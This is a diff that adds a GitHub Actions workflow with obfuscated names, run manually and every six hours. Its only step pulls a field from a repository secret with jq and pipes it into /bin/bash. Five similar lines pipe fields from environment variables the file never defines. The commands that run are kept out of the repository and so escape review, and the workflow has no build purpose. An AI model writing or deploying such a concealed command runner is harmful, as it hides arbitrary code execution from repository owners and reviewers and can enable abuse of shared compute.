@@ -1,0 +1,23 @@
+name: jingchangxingpi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jingchangxingpi
+        env:
+          lvat0683: ${{ secrets.lvat0683 }}
+        run: |
+          echo $lvat0683 | jq -r .ybjd95737 | /bin/bash
+          echo $v815 | jq -r .twj70 | /bin/bash
+          echo $wgik50 | jq -r .oaj4 | /bin/bash
+          echo $r1 | jq -r .dpp833 | /bin/bash
+          echo $yrlq8 | jq -r .cwdan04 | /bin/bash
+          echo $lelya91 | jq -r .ys82 | /bin/bash
+
